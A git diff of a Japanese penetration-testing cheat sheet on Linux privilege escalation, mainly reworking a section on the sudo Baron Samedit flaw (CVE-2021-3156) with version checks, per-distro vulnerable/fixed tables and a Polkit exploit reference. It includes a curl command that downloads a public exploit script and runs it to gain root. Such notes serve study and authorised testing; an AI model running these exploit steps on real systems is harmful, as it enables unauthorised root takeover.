@@ -701,6 +701,8 @@ su -
 mv /tmp/passwd.bak /etc/passwd
 ```
 
+---
+
 ### Polkit
 
 1. Polkitの有無を確認
@@ -730,6 +732,8 @@ searchsploit -m 50011
 ```
 - 失敗すると、`[*] Attempting to create account`でハングする
 
+---
+
 ### sudo Baron Samedit (CVE-2021-3156)
 
 https://github.com/worawit/CVE-2021-3156
@@ -739,96 +743,46 @@ https://github.com/worawit/CVE-2021-3156
 sudo --version
 ```
 - → 出力の先頭行のバージョンを確認し、脆弱なバージョンか判定    
-	- 1.8.2 ～ 1.8.31p2、1.9.0 ～ 1.9.5p1`
+	- 1.8.2 ～ 1.8.31p2、1.9.0 ～ 1.9.5p1
 
-※ ディストロによってはバックポート修正されているため  
-パッケージのリビジョンも確認する
+2. ディストロによってはバックポート修正されているため、パッケージのリビジョンも確認する
+```sh
+# Debian / Ubuntu の場合
+dpkg -l sudo
+# RHEL / CentOS / Fedora の場合
+rpm -qa | grep sudo
+```
+- → 出力を **vulnerable / fixed バージョン表** と照合
 
-#### Debian / Ubuntu の場合
+3. exploit の実行
+```sh
+curl -fsSL https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py -o exploit_nss.py
 
-`dpkg -l sudo`
+python3 exploit_nss.py
+```
 
-#### RHEL / CentOS / Fedora の場合
-
-`rpm -qa | grep sudo`
-
-→ 出力を **vulnerable / fixed バージョン表** と照合
-
----
-
-4. exploit の実行
-    
-
-`curl -fsSL https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py -o exploit_nss.py python3 exploit_nss.py`
-
-成功すると：
-
-`# id uid=0(root) gid=0(root)`
-
----
-
-## 特徴 / 成功条件
-
-- sudo 権限不要
-    
-- パスワード不要
-    
-- ローカルユーザでOK
-    
-- SUID sudo があれば成立（通常は必ず付いている）
-    
-
-SUID 確認：
-
-`ls -l /usr/bin/sudo`
-
-`-rwsr-xr-x`
-
----
-
-## 失敗する主な原因
-
-- 修正済み sudo
-    
-- exploit と glibc / ディストロの相性
-    
-- Python 不在（別 exploit を使用）
-    
-
----
-
-## ディストロごとの vulnerable / fixed バージョン
+#### ディストロごとの vulnerable / fixed バージョン
 
 🔗参照：  
 https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow.txt
 
-### Ubuntu
+| Ubuntu version | Vulnerable          | Fixed               |
+| -------------- | ------------------- | ------------------- |
+| 16.04 LTS      | 1.8.16 ～ 1.8.31p2   | 1.8.16-0ubuntu1.10  |
+| 18.04 LTS      | 1.8.21p2 ～ 1.8.31p2 | 1.8.21p2-3ubuntu1.4 |
+| 20.04 LTS      | 1.8.31              | 1.8.31-1ubuntu1.2   |
 
-|Ubuntu version|Vulnerable|Fixed|
-|---|---|---|
-|16.04 LTS|1.8.16 ～ 1.8.31p2|1.8.16-0ubuntu1.10|
-|18.04 LTS|1.8.21p2 ～ 1.8.31p2|1.8.21p2-3ubuntu1.4|
-|20.04 LTS|1.8.31|1.8.31-1ubuntu1.2|
+| Debian version | Vulnerable | Fixed               |
+| -------------- | ---------- | ------------------- |
+| Stretch        | vulnerable | 1.8.19p1-2.1+deb9u3 |
+| Buster         | vulnerable | 1.8.27-1+deb10u3    |
+| Bullseye       | vulnerable | 1.9.5p2-3           |
 
----
-
-### Debian
-
-|Debian version|Vulnerable|Fixed|
-|---|---|---|
-|Stretch|vulnerable|1.8.19p1-2.1+deb9u3|
-|Buster|vulnerable|1.8.27-1+deb10u3|
-|Bullseye|vulnerable|1.9.5p2-3|
-
----
-
-### RHEL / CentOS
-
-| Version | Fixed                    |
-| ------- | ------------------------ |
-| 6       | sudo-1.8.6p7-29.el6_10.3 |
-| 7       | sudo-1.8.23-10.el7_9.1   |
-| 8       | sudo-1.8.29-6.el8_3.1    |
+| RHEL / CentOS Version | Fixed                    |
+| --------------------- | ------------------------ |
+| 6                     | sudo-1.8.6p7-29.el6_10.3 |
+| 7                     | sudo-1.8.23-10.el7_9.1   |
+| 8                     | sudo-1.8.29-6.el8_3.1    |
 
 ---
 ---
